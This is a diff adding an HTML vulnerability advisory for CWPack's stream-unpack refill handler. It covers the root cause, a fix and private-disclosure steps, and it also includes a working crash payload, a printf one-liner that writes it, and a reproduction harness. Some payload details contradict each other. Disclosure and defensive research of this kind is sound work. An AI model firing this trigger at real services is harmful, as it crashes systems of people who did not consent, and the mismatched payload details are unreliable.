@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CWPack Advisory — heap OOB in stream-unpack refill handler</title>
+<style>
+  :root{
+    --bg:#0e1014; --panel:#161a21; --panel-2:#1b2029; --ink:#e7eaef; --ink-soft:#aab2bf;
+    --ink-faint:#788393; --line:#262c37; --line-soft:#20252e;
+    --accent:#f0a63c;            /* High severity amber */
+    --danger:#e5484d; --warn:#f0a63c; --ok:#3dd68c; --info:#5aa9e6;
+    --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
+    --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Inter,Helvetica,Arial,sans-serif;
+  }
+  @media (prefers-color-scheme: light){
+    :root{
+      --bg:#f6f7f9; --panel:#ffffff; --panel-2:#f0f2f5; --ink:#161a20; --ink-soft:#434b57;
+      --ink-faint:#6b7482; --line:#e2e6ec; --line-soft:#eceff3;
+      --accent:#b9721a; --danger:#c62a2f; --warn:#b9721a; --ok:#1f9d5c; --info:#2a6db0;
+    }
+  }
+  *{box-sizing:border-box}
+  html{-webkit-text-size-adjust:100%}
+  body{
+    margin:0; background:var(--bg); color:var(--ink);
+    font-family:var(--sans); font-size:16px; line-height:1.62;
+    -webkit-font-smoothing:antialiased;
+  }
+  .wrap{max-width:860px; margin:0 auto; padding:0 22px 96px}
+  a{color:var(--info); text-decoration:none}
+  a:hover{text-decoration:underline}
+
+  /* Header */
+  header.top{padding:52px 0 30px; border-bottom:1px solid var(--line)}
+  .eyebrow{font-family:var(--mono); font-size:12px; letter-spacing:.14em; text-transform:uppercase;
+    color:var(--ink-faint); margin:0 0 16px}
+  h1{font-size:30px; line-height:1.22; letter-spacing:-.01em; margin:0 0 18px; text-wrap:balance; font-weight:680}
+  h1 code{font-family:var(--mono); font-size:.82em; background:var(--panel-2); padding:.08em .32em; border-radius:5px}
+  .lede{font-size:17px; color:var(--ink-soft); margin:0; max-width:64ch}
+
+  .badges{display:flex; flex-wrap:wrap; gap:9px; margin:22px 0 0}
+  .badge{display:inline-flex; align-items:center; gap:7px; font-family:var(--mono); font-size:12.5px;
+    padding:6px 11px; border-radius:999px; border:1px solid var(--line); background:var(--panel)}
+  .badge.sev{border-color:color-mix(in srgb,var(--accent) 55%,var(--line)); color:var(--accent);
+    background:color-mix(in srgb,var(--accent) 12%,transparent); font-weight:600}
+  .badge .dot{width:8px; height:8px; border-radius:50%}
+  .dot.amber{background:var(--warn)} .dot.green{background:var(--ok)} .dot.blue{background:var(--info)}
+
+  /* Meta grid */
+  .meta{display:grid; grid-template-columns:repeat(2,1fr); gap:1px; background:var(--line);
+    border:1px solid var(--line); border-radius:12px; overflow:hidden; margin:30px 0 8px}
+  .meta div{background:var(--panel); padding:13px 16px}
+  .meta dt{font-family:var(--mono); font-size:11px; letter-spacing:.08em; text-transform:uppercase;
+    color:var(--ink-faint); margin:0 0 4px}
+  .meta dd{margin:0; font-size:14.5px; word-break:break-word}
+  .meta dd code{font-family:var(--mono); font-size:13px}
+  @media (max-width:560px){ .meta{grid-template-columns:1fr} }
+
+  /* Sections */
+  section{padding:34px 0; border-bottom:1px solid var(--line-soft)}
+  h2{font-size:13px; font-family:var(--mono); letter-spacing:.1em; text-transform:uppercase;
+    color:var(--accent); margin:0 0 18px; font-weight:600; display:flex; align-items:baseline; gap:10px}
+  h2 .n{color:var(--ink-faint)}
+  h3{font-size:16.5px; margin:26px 0 10px; font-weight:640}
+  p{margin:0 0 14px} p:last-child{margin-bottom:0}
+  ul,ol{margin:0 0 14px; padding-left:22px} li{margin:6px 0}
+  strong{font-weight:660}
+  code{font-family:var(--mono); font-size:.9em; background:var(--panel-2); padding:.06em .34em; border-radius:4px}
+
+  /* Code blocks */
+  pre{background:var(--panel); border:1px solid var(--line); border-radius:10px;
+    padding:16px 18px; overflow-x:auto; margin:0 0 16px; font-family:var(--mono); font-size:13px;
+    line-height:1.6; color:var(--ink)}
+  pre code{background:none; padding:0; font-size:inherit}
+  .cap{font-family:var(--mono); font-size:11.5px; color:var(--ink-faint); margin:0 0 7px;
+    letter-spacing:.03em}
+  .hl{color:var(--accent)} .cm{color:var(--ink-faint)} .dn{color:var(--danger)}
+
+  /* Callout */
+  .call{border:1px solid var(--line); border-left:3px solid var(--accent); background:var(--panel);
+    border-radius:0 10px 10px 0; padding:14px 18px; margin:0 0 16px}
+  .call.ok{border-left-color:var(--ok)} .call.danger{border-left-color:var(--danger)}
+  .call p{margin:0}
+
+  /* Payload highlight */
+  .payload{display:block; background:var(--panel-2); border:1px dashed color-mix(in srgb,var(--accent) 45%,var(--line));
+    border-radius:10px; padding:16px 18px; font-family:var(--mono); font-size:15px; letter-spacing:.04em;
+    color:var(--accent); text-align:center; margin:0 0 14px; word-break:break-all}
+
+  /* Tables */
+  table{width:100%; border-collapse:collapse; margin:0 0 16px; font-size:14px}
+  th,td{text-align:left; padding:11px 14px; border-bottom:1px solid var(--line-soft); vertical-align:top}
+  th{font-family:var(--mono); font-size:11px; letter-spacing:.07em; text-transform:uppercase; color:var(--ink-faint); font-weight:500}
+  tbody tr:last-child td{border-bottom:none}
+  td code{font-size:12.5px}
+  .tag{font-family:var(--mono); font-size:11px; padding:3px 8px; border-radius:5px; white-space:nowrap; font-weight:600}
+  .tag.conf{color:var(--ok); background:color-mix(in srgb,var(--ok) 15%,transparent)}
+  .tag.no{color:var(--ink-faint); background:var(--panel-2)}
+  .tag.part{color:var(--warn); background:color-mix(in srgb,var(--warn) 15%,transparent)}
+
+  .cvss{font-family:var(--mono); font-size:14px; background:var(--panel); border:1px solid var(--line);
+    border-radius:8px; padding:12px 15px; margin:0 0 14px; color:var(--ink); overflow-x:auto; white-space:nowrap}
+  .cvss b{color:var(--accent)}
+
+  footer{padding:34px 0 0; color:var(--ink-faint); font-size:13px}
+  footer .mono{font-family:var(--mono)}
+  .disc{background:var(--panel); border:1px solid var(--line); border-radius:10px; padding:16px 18px; margin:0 0 18px}
+  .disc p{margin:0 0 8px; font-size:14px; color:var(--ink-soft)} .disc p:last-child{margin:0}
+
+  @media print{
+    body{background:#fff; color:#000; font-size:12px}
+    .badge,.meta div,pre,.call,.disc{background:#fff}
+    section{break-inside:avoid}
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header class="top">
+    <p class="eyebrow">Security Advisory · discovered by Nemesis Forge</p>
+    <h1>Heap out-of-bounds (<code>negative-size memmove</code>) in CWPack's stream-unpack refill handler</h1>
+    <p class="lede">A truncated or length-lying MessagePack stream drives the parse cursor past the buffer end, causing the next refill to call <code>memmove</code> with a negative (huge) size — a reliable remote crash reachable through CWPack's simplest documented stream-decode loop.</p>
+    <div class="badges">
+      <span class="badge sev">HIGH · CVSS 3.1 &nbsp;7.1</span>
+      <span class="badge"><span class="dot amber"></span>CWE-787 / CWE-125</span>
+      <span class="badge"><span class="dot green"></span>No public report found</span>
+      <span class="badge"><span class="dot blue"></span>Latest master · unpatched</span>
+    </div>
+  </header>
+
+  <dl class="meta">
+    <div><dt>Component</dt><dd>CWPack — ANSI&nbsp;C MessagePack encoder/decoder (<a href="https://github.com/clwi/CWPack">clwi/CWPack</a>)</dd></div>
+    <div><dt>Affected file</dt><dd><code>goodies/basic-contexts/basic_contexts.c</code></dd></div>
+    <div><dt>Function</dt><dd><code>handle_stream_unpack_underflow</code></dd></div>
+    <div><dt>Affected versions</dt><dd>All — present at latest <code>master</code> (<code>833fec9</code>, unchanged since 2022-03-11)</dd></div>
+    <div><dt>Vulnerability class</dt><dd>OOB read/write via unchecked short read → integer underflow → negative size to <code>memmove</code></dd></div>
+    <div><dt>Confirmed impact</dt><dd>Remote denial of service + bounded heap over-read</dd></div>
+    <div><dt>Status</dt><dd>Coordinated disclosure — no CVE / OSV / GHSA match</dd></div>
+    <div><dt>Discovered</dt><dd>Nemesis Forge (autonomous fuzzing + sanitizer oracle), 2026-07-18</dd></div>
+  </dl>
+
+  <section>
+    <h2><span class="n">01</span> Summary</h2>
+    <p>CWPack ships ready-to-use "contexts" under <code>goodies/basic-contexts/</code>, including a <strong>stream unpack context</strong> that decodes MessagePack from a <code>FILE*</code>, refilling a fixed-size buffer on demand via <code>handle_stream_unpack_underflow</code>. This is the documented, canonical way to stream-decode with CWPack, and applications commonly use it verbatim.</p>
+    <p>The refill handler calls <code>fread</code> to top up its buffer but <strong>only checks whether it read <em>zero</em> bytes</strong> — it never verifies it obtained the number of bytes the parser requested. On a <strong>short read</strong> (a truncated message, or a blob header that lies about its length), the handler returns success anyway. The core parser then advances its read cursor by the full requested amount, pushing <code>current</code> <strong>past <code>end</code></strong>. On the next refill, <code>remains = end - current</code> underflows to a huge unsigned value and is handed to <code>memmove</code> — an unbounded copy from a pointer that is already out of bounds.</p>
+    <div class="call">
+      <p>An attacker who can supply MessagePack bytes to an app using the stream context needs only one small message: <strong>declare a string longer than the stream actually contains.</strong></p>
+    </div>
+  </section>
+
+  <section>
+    <h2><span class="n">02</span> Affected code &amp; root cause</h2>
+    <p class="cap">goodies/basic-contexts/basic_contexts.c</p>
+    <pre><code>153  static int handle_stream_unpack_underflow(struct cw_unpack_context* uc, unsigned long more)
+154  {
+155      stream_unpack_context* suc = (stream_unpack_context*)uc;
+156      unsigned long remains = (unsigned long)(uc-&gt;end - uc-&gt;current);   <span class="cm">// (A) unsigned; assumes current &lt;= end</span>
+157      if (remains)
+158      {
+159          memmove (uc-&gt;start, uc-&gt;current, remains);                    <span class="dn">// (D) CRASH: remains huge when current &gt; end</span>
+160      }
+     ...
+173      uc-&gt;current = uc-&gt;start;
+174      uc-&gt;end = uc-&gt;start + remains;
+175      unsigned long l = fread(uc-&gt;end, 1, suc-&gt;buffer_length - remains, suc-&gt;file);
+176      if (!l)                                                           <span class="hl">// (B) ONLY the zero case is handled</span>
+177      {
+178          if (feof(suc-&gt;file))  return CWP_RC_END_OF_INPUT;
+179          suc-&gt;uc.err_no = ferror(suc-&gt;file);
+180          return CWP_RC_ERROR_IN_HANDLER;
+181      }
+184      uc-&gt;end += l;                                                     <span class="hl">// (C) l may be &lt; more; end short of demand</span>
+186      return CWP_RC_OK;                                                 <span class="cm">//     ...yet we return OK</span>
+187  }</code></pre>
+    <p class="cap">src/cwpack_internals.h — cw_unpack_assert_space_sub(more)</p>
+    <pre><code>p   = unpack_context-&gt;current;
+nyp = p + more;
+if (nyp &gt; unpack_context-&gt;end) {
+    int rc = unpack_context-&gt;handle_unpack_underflow(unpack_context, (unsigned long)(more));
+    ...                              <span class="cm">// rc == CWP_RC_OK is trusted as "more bytes are now available"</span>
+    p = unpack_context-&gt;current; nyp = p + more;
+}
+unpack_context-&gt;current = nyp;       <span class="dn">// (C') advances by `more` unconditionally → past end after a short read</span></code></pre>
+    <p>The core assumes a <code>CWP_RC_OK</code> return means <code>more</code> bytes are now present between <code>current</code> and <code>end</code>. The stream handler returns <code>CWP_RC_OK</code> after reading <em>any</em> non-zero number of bytes. When the input declares a blob larger than the remaining stream:</p>
+    <ol>
+      <li><code>fread</code> returns <code>l</code> with <code>0 &lt; l &lt; more</code> (short read — C).</li>
+      <li>Handler returns <code>CWP_RC_OK</code> (B) with <code>end = start + remains + l</code>.</li>
+      <li>Core sets <code>current = current + more</code> (C'), so <code>current &gt; end</code>.</li>
+      <li>The next parse step calls the handler again; now <code>remains = (unsigned long)(end - current)</code> (A) is a small negative difference reinterpreted as <code>size_t</code> — a huge value.</li>
+      <li><code>memmove(start, current, remains)</code> (D) executes with that size → out-of-bounds.</li>
+    </ol>
+    <p>This is a self-contained defect in the refill handler's short-read handling. It is unrelated to CWPack issue <a href="https://github.com/clwi/CWPack/issues/22">#22</a> (a 32-bit pointer-arithmetic wrap in the core macro), which its author states <em>"does not involve <code>handle_stream_unpack_underflow</code> or <code>fread</code> short reads."</em></p>
+  </section>
+
+  <section>
+    <h2><span class="n">03</span> Proof-of-concept payload</h2>
+    <p>The minimal trigger is <strong>17 bytes</strong> — a <code>fixstr</code> header declaring a 22-byte string followed by only 16 bytes. No base64, Python, or fuzzer required:</p>
+    <span class="payload">b6 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff 05</span>
+    <table>
+      <thead><tr><th>Bytes</th><th>MessagePack meaning</th></tr></thead>
+      <tbody>
+        <tr><td><code>b6</code></td><td><code>fixstr</code> header, declared length <code>0x16 &amp; 0x1f = 22</code> bytes</td></tr>
+        <tr><td>following 16 bytes</td><td>the string "payload" — but only <strong>16</strong> present, not the declared <strong>22</strong></td></tr>
+      </tbody>
+    </table>
+    <p class="cap">create it — one line, anyone can run</p>
+    <pre><code>printf '\xb6\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff' &gt; crash.bin</code></pre>
+    <p>The 16 filler bytes are arbitrary; only the <em>count</em> (fewer than the declared 22) matters. The vulnerability is general — for any buffer size, a declared blob length exceeding the remaining stream bytes drives <code>current</code> past <code>end</code>.</p>
+  </section>
+
+  <section>
+    <h2><span class="n">04</span> Reproduction</h2>
+    <p class="cap">poc.c — the simplest documented stream-unpack loop, no tricks</p>
+    <pre><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include "basic_contexts.h"
+
+int main(int argc, char** argv) {
+    FILE* f = fopen(argv[1], "rb");
+    if (!f) return 0;
+    stream_unpack_context suc;
+    memset(&amp;suc, 0, sizeof(suc));
+    init_stream_unpack_context(&amp;suc, 16, f);   <span class="cm">/* small buffer forces the refill path */</span>
+    while (suc.uc.return_code == CWP_RC_OK)
+        cw_unpack_next((cw_unpack_context*)&amp;suc);
+    terminate_stream_unpack_context(&amp;suc);
+    fclose(f);
+    return 0;
+}</code></pre>
+    <p class="cap">build (any clang with AddressSanitizer; libFuzzer NOT required) &amp; run</p>
+    <pre><code>git clone https://github.com/clwi/CWPack
+clang -fsanitize=address -g -O1 \
+  -ICWPack/goodies/basic-contexts -ICWPack/src \
+  poc.c CWPack/goodies/basic-contexts/basic_contexts.c CWPack/src/cwpack.c -o poc
+./poc crash.bin</code></pre>
+    <p class="cap">observed output (AddressSanitizer, arm64) — deterministic, not platform-specific</p>
+    <pre><code><span class="dn">==ERROR: AddressSanitizer: negative-size-param: (size=-6)</span>
+    #0 __asan_memmove
+    #1 handle_stream_unpack_underflow basic_contexts.c:159
+    #2 cw_unpack_next            cwpack.c:476
+    #3 main                      poc.c:15
+0x... is located 22 bytes inside of 32-byte region  <span class="cm">(the realloc'd buffer)</span>
+SUMMARY: AddressSanitizer: negative-size-param basic_contexts.c:159 in handle_stream_unpack_underflow</code></pre>
+  </section>
+
+  <section>
+    <h2><span class="n">05</span> Risk &amp; severity</h2>
+    <h3>Where it bites</h3>
+    <p>Any point where untrusted MessagePack reaches a <code>stream_unpack_context</code>:</p>
+    <ul>
+      <li><strong>Network services</strong> speaking MessagePack over a socket/pipe (<code>FILE*</code>) — RPC, IoT/telemetry, game servers. One malformed frame from an unauthenticated peer crashes the decoder.</li>
+      <li><strong>File / message parsers</strong> decoding MessagePack from disk or a queue — a poisoned file crashes the consumer on open.</li>
+      <li><strong>Embedded / edge devices</strong> — CWPack's stated niche; a crash is a hard fault and recovery may mean a reboot.</li>
+    </ul>
+
+    <h3>Impact tiers</h3>
+    <table>
+      <thead><tr><th>Tier</th><th>Status</th><th>Detail</th></tr></thead>
+      <tbody>
+        <tr><td>Availability (DoS)</td><td><span class="tag conf">Confirmed</span></td><td>Deterministic heap OOB <code>memmove</code> → immediate crash. One small message downs the process. Repeatable at will.</td></tr>
+        <tr><td>Confidentiality (leak)</td><td><span class="tag part">Confirmed · bounded</span></td><td>Before the fatal copy, the parser returns a <code>str</code>/<code>bin</code> item whose declared length exceeds the valid bytes; an app that reads it over-reads adjacent heap — up to the declared length can leak.</td></tr>
+        <tr><td>Integrity (write / RCE)</td><td><span class="tag no">Not claimed</span></td><td>The <code>memmove</code> size is <code>~ULONG_MAX</code>, which normally faults immediately. Turning it into a bounded, attacker-shaped write would need heap grooming and is <strong>not</strong> demonstrated.</td></tr>
+      </tbody>
+    </table>
+
+    <h3>CVSS 3.1</h3>
+    <p class="cap">confirmed / conservative — remote DoS + bounded over-read</p>
+    <div class="cvss"><b>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H</b> &nbsp;→&nbsp; base <b>7.1 (High)</b></div>
+    <p>If reachability is local-only (a file parser not network-exposed), <code>AV:L</code> → <strong>5.1 (Medium)</strong>. An <em>upper bound</em> of ~9.8 (Critical) would apply only if a controllable heap write were demonstrated — which is explicitly <strong>not</strong> asserted here.</p>
+  </section>
+
+  <section>
+    <h2><span class="n">06</span> Novelty verification</h2>
+    <p>Checked before disclosure — no matching report found:</p>
+    <table>
+      <thead><tr><th>Source</th><th>Result</th></tr></thead>
+      <tbody>
+        <tr><td>NVD / CVE (MessagePack)</td><td>No CWPack entry — all hits are MessagePack-C#/.NET or msgpack-python</td></tr>
+        <tr><td>OSV.dev (commit query)</td><td>Empty — no vulnerability recorded for <code>833fec9</code></td></tr>
+        <tr><td>GitHub Security Advisories</td><td>Nearest is msgpack-python (different codebase)</td></tr>
+        <tr><td>CWPack issues (open + closed)</td><td>Only <a href="https://github.com/clwi/CWPack/issues/22">#22</a> — a distinct 32-bit pointer-arith bug</td></tr>
+        <tr><td>CWPack pull requests</td><td>Zero touching the stream handler / short-read / memory safety</td></tr>
+        <tr><td>36 forks</td><td>Only one active (a C++/CMake port) — no fork carries a fix</td></tr>
+        <tr><td>Upstream fix</td><td>None — latest <code>master</code> still contains the code above</td></tr>
+      </tbody>
+    </table>
+    <div class="call ok"><p><strong>"No public report found"</strong> is the honest claim after this sweep — not a proof of non-existence. The finding is distinct from CWPack issue&nbsp;#22.</p></div>
+  </section>
+
+  <section>
+    <h2><span class="n">07</span> Suggested fix</h2>
+    <p>Treat a partial read as underflow, not success — fill until the requested bytes are actually available, or fail cleanly:</p>
+    <pre><code><span class="cm">/* fill until we actually have `more` bytes available, or EOF/err */</span>
+while ((unsigned long)(uc-&gt;end - uc-&gt;current) &lt; more)
+{
+    unsigned long want = suc-&gt;buffer_length - (unsigned long)(uc-&gt;end - uc-&gt;start);
+    unsigned long l = fread(uc-&gt;end, 1, want, suc-&gt;file);
+    if (!l)
+    {
+        if (feof(suc-&gt;file))  return CWP_RC_END_OF_INPUT;
+        suc-&gt;uc.err_no = ferror(suc-&gt;file);
+        return CWP_RC_ERROR_IN_HANDLER;
+    }
+    uc-&gt;end += l;
+}</code></pre>
+    <p><strong>Defense in depth:</strong> in <code>cw_unpack_assert_space_sub</code>, after the handler returns <code>CWP_RC_OK</code>, assert <code>current + more &lt;= end</code> before advancing, so any non-conforming custom handler cannot push the cursor past <code>end</code>.</p>
+  </section>
+
+  <section>
+    <h2><span class="n">08</span> How to report this</h2>
+    <p>CWPack ships no <code>SECURITY.md</code> and no published security contact, so use the standard fallback order for a solo-maintained MIT project. Report privately first — do not open a public issue with the PoC.</p>
+
+    <h3>Recipient &amp; channels</h3>
+    <table>
+      <thead><tr><th>Priority</th><th>Channel</th><th>Where</th></tr></thead>
+      <tbody>
+        <tr><td><span class="tag conf">1 · preferred</span></td><td>GitHub private vulnerability report</td><td><a href="https://github.com/clwi/CWPack/security/advisories/new">github.com/clwi/CWPack/security/advisories/new</a> &nbsp;(Repo → <strong>Security</strong> → <strong>Report a vulnerability</strong>). Keeps it private, creates a tracked advisory. If the tab is disabled, use #2.</td></tr>
+        <tr><td><span class="tag part">2 · fallback</span></td><td>Direct email to the maintainer</td><td><span class="mono">the maintainer</span> — Claes Wihlborg (from the repo LICENSE © 2017 and every commit's author line). Attach the docs + <code>poc.c</code> + <code>crash.bin</code>.</td></tr>
+        <tr><td><span class="tag no">3 · last resort</span></td><td>Public issue <em>without</em> exploit detail</td><td>Only if 1 &amp; 2 get no response after the agreed window. State a memory-safety bug exists and a private report is waiting — <strong>do not</strong> post the PoC.</td></tr>
+      </tbody>
+    </table>
+    <p class="cap" style="margin-top:6px">project facts · repo github.com/clwi/CWPack · maintainer Claes Wihlborg (clwi) · MIT © 2017 · latest 833fec9 (source unchanged since 2022-03-11) · distinct from open issue #22</p>
+
+    <h3>Cover note — copy &amp; send</h3>
+    <p class="cap">fill the bracketed fields before sending</p>
+    <pre><code>Subject: Security: heap out-of-bounds in CWPack stream-unpack (private disclosure)
+
+Hello Claes,
+
+I'm a security researcher (M.S. CS, University of Dayton). While fuzzing CWPack
+with a tool I build, I found a heap out-of-bounds in the provided stream-unpack
+context (handle_stream_unpack_underflow, goodies/basic-contexts/basic_contexts.c).
+
+A truncated / length-lying MessagePack stream causes a short fread to be treated
+as success: the parser advances its cursor past the buffer end, and the next
+refill calls memmove with a negative (huge) size. AddressSanitizer reports
+negative-size-param. It reproduces on the latest master (833fec9) via the
+simplest documented stream-unpack loop, on 64-bit.
+
+This is distinct from issue #22 (that is the 32-bit pointer-arithmetic bounds
+bypass; this is the stream refill handler's short-read handling).
+
+I'm following coordinated disclosure. Attached: a full technical write-up, a
+step-by-step reproduce guide, a ~30-line PoC (poc.c), a 17-byte minimal crash
+input, and a suggested fix. Happy to help verify a patch. Could we agree on a
+disclosure timeline? I default to 90 days, flexible.
+
+Thanks for CWPack,
+[your name]
+[contact address you monitor]</code></pre>
+
+    <h3>Reporter identity block</h3>
+    <p class="cap">paste at the top of the advisory / email — pick the name form you use publicly, confirm the contact</p>
+    <pre><code>Reporter:      [your name]
+Affiliation:   University of Dayton — M.S. Computer Science (security research)
+Context:       Independent vulnerability research using Nemesis Forge, an
+               autonomous fuzzing / vulnerability-discovery engine I build.
+Contact:       [your preferred disclosure email]
+Disclosure:    Coordinated / responsible disclosure. Found by local fuzzing of
+               the open-source library only — no third-party systems accessed.</code></pre>
+
+    <h3>What to attach</h3>
+    <ul>
+      <li><code>CWPack-stream-unpack-negative-size.md</code> — full technical report + suggested fix</li>
+      <li><code>CWPack-REPLICATION.md</code> — step-by-step reproduce guide</li>
+      <li><code>CWPack-poc/poc.c</code> — minimal proof of concept</li>
+      <li><code>CWPack-poc/crash-minimal.bin</code> — 17-byte trigger (or the one-line <code>printf</code> from §03)</li>
+    </ul>
+
+    <div class="call">
+      <p><strong>Do</strong> keep it private until the maintainer responds or the timeline lapses · <strong>do</strong> offer to test the fix. &nbsp;<strong>Don't</strong> post <code>crash.bin</code>/<code>poc.c</code> publicly before a patch · <strong>don't</strong> request a bounty (unfunded solo MIT project) · <strong>don't</strong> call it a "zero-day" publicly until confirmed/fixed — "a previously-unreported memory-safety bug" is the accurate phrasing.</p>
+    </div>
+  </section>
+
+  <footer>
+    <p class="mono">Discovered by Nemesis Forge — autonomous coverage-guided harness synthesis + deterministic sanitizer oracle. Advisory generated 2026-07-18.</p>
+  </footer>
+
+</div>
+</body>
+</html>
